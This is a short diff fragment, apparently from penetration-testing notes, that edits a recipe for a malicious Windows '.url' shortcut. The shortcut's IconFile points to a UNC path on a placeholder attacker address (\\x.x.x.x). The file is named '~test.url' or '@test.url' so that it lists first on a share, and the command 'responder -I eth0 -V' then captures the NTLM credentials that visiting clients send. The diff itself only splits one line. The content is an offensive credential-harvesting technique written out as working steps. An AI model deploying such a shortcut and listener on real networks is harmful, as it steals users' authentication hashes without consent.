@@ -5,7 +5,9 @@ WorkingDirectory=blah
 IconFile=\\x.x.x.x\%USERNAME%.icon 
 IconIndex=1
 
-Safe the file as: "~test.url" or "@test.url"
+Safe the file as: 
+"~test.url"
+"@test.url"
 
 
 responder -I eth0 -V
